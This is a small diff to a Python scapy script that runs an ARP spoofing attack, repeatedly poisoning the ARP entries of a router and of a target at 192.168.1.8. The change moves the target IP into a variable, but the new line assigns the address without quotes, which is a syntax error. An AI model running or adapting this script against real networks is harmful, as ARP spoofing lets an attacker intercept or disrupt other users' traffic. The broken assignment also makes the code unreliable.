@@ -10,6 +10,7 @@ import socket
 from scapy.all import *
 
 routerip = socket.gethostbyname(socket.gethostname())
+macip = 192.168.1.8
 
 def get_target_mac(ip):
     arp_request = scapy.all.ARP(pdst=ip)
@@ -33,8 +34,8 @@ def main():
     iter = 0
     try:
         while True:
-            spoof_arp(routerip,"192.168.1.8")
-            spoof_arp("192.168.1.8",routerip)
+            spoof_arp(routerip,macip)
+            spoof_arp(macip,routerip)
             iter = iter + 1;
             print iter
     except KeyboardInterrupt:
